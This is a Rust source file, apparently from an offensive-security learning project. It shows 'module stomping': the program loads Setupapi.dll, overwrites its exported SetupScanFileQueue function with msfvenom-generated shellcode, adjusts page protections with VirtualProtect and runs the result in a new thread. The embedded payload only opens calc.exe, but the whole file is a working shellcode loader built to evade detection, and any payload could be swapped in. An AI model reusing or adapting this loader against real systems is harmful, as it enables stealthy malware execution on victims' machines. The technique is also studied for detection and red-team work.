use ::core::{ffi::c_void, mem::transmute, ptr::null_mut};
use ::std::io::{stdin, stdout, Read, Write};

use ::windows::{
    core::PCSTR,
    Win32::{
        Foundation::{CloseHandle, GetLastError},
        System::{
            LibraryLoader::{GetModuleHandleA, GetProcAddress, LoadLibraryA},
            Memory::{VirtualProtect, PAGE_EXECUTE_READ, PAGE_PROTECTION_FLAGS, PAGE_READWRITE},
            Threading::{
                CreateThread, WaitForSingleObject, INFINITE, THREAD_CREATE_RUN_IMMEDIATELY,
                THREAD_CREATION_FLAGS,
            },
        },
    },
};

// $ msfvenom -a x64 --platform windows -p windows/x64/exec cmd='cmd.exe /c calc.exe' -f rust
const SHELLCODE: [u8; 287] = [
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51,
    0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52,
    0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
    0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed,
    0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88,
    0x00, 0x00, 0x00, 0x48, 0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
    0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41, 0x8b, 0x34, 0x88, 0x48,
    0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1,
    0x38, 0xe0, 0x75, 0xf1, 0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
    0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44, 0x8b, 0x40, 0x1c, 0x49,
    0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01, 0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a,
    0x41, 0x58, 0x41, 0x59, 0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
    0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48, 0xba, 0x01, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d, 0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b,
    0x6f, 0x87, 0xff, 0xd5, 0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
    0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0, 0x75, 0x05, 0xbb, 0x47,
    0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89, 0xda, 0xff, 0xd5, 0x63, 0x6d, 0x64, 0x2e, 0x65,
    0x78, 0x65, 0x20, 0x2f, 0x63, 0x20, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00,
];

// sacrificial function and the module it is exported by 
const T_MODULE: &str = "Setupapi.dll\0";
const T_METHOD: &str = "SetupScanFileQueue\0";

// writes a payload into the specified memory region 
fn write_payload(p_addr: *const c_void) -> bool {
    unsafe {
        
        // we set with `PAGE_READWRITE` here to rewrite memory, then change to `PAGE_EXECUTE_READ` 
        // prior to execution
        let mut old_protect = PAGE_READWRITE;
        match VirtualProtect(p_addr, SHELLCODE.len(), PAGE_READWRITE, &mut old_protect) {
            // this would be more succinct with a `VirtualProtect(...).is_err()` 
            // check but what's done is done and i refuse to apologise for my actions
            Ok(_) => (),
            Err(err) => {
                println!(
                    "[x] VirtualProtect (RW) -> FAIL: {} \n-> {:?}",
                    err,
                    GetLastError()
                );
                return false; // VirtualProtect RW failure
            }
        }
        
        std::ptr::copy(SHELLCODE.as_ptr() as _, p_addr as _, SHELLCODE.len());
        match VirtualProtect(p_addr, SHELLCODE.len(), PAGE_EXECUTE_READ, &mut old_protect) {
            // this also doesnt have to be a pattern matching block
            Ok(_) => (),
            Err(err) => {
                println!(
                    "[x] VirtualProtect (RX) -> FAIL: {} \n-> {:?}",
                    err,
                    GetLastError()
                );
                return false; // VirtualProtect RX failure
            }
        }

        // 
        return true; 
    }
}

fn main() {
    let sac_module: PCSTR = PCSTR::from_raw(T_MODULE.as_ptr());
    let sac_func: PCSTR = PCSTR::from_raw(T_METHOD.as_ptr());

    unsafe {
        // retrieve handle to sacrificial DLL and the address of our sacrificial function
        // within that DLL
        let h_module = LoadLibraryA(sac_module).unwrap();
        let proc_addr = GetProcAddress(h_module, sac_func).unwrap();

        // i did this at like 4am, im sure there was a reason but also this seems like nonsense lol
        let abs_addr = h_module.0 as isize + (proc_addr as isize - h_module.0 as isize);
        println!("[?] absolute addr of stompable function: '{:x?}'", abs_addr);
        println!(
            "[?] fn addr as c_void ptr: '{:x?}'",
            abs_addr as *const c_void
        );

        // this function writes the payload to the base address and then sets 
        // protection to RX in one go
        if !write_payload(abs_addr as *const c_void) {
            panic!("[x] Unable to finish overwriting function.");
        }
        println!("[+] copied shellcode to ext module function.");

        // cast address ptr to function (microsoft createthread nightmare type)
        let thread_entry: unsafe extern "system" fn(*mut c_void) -> u32 = { transmute(abs_addr) };
        println!("[*] set entry to {:?}", thread_entry);

        // execute function in a new thread 
        let mut thread_id = 0;
        let h_thread = CreateThread(
            None,
            0,
            Some(thread_entry),
            None,
            THREAD_CREATE_RUN_IMMEDIATELY,
            Some(&mut thread_id),
        )
        .unwrap();

        println!(
            "[+] waiting on thread '{}' to complete...",
            thread_id
        );

        // :\
        WaitForSingleObject(h_thread, INFINITE);
        CloseHandle(h_thread).unwrap();
    }
}
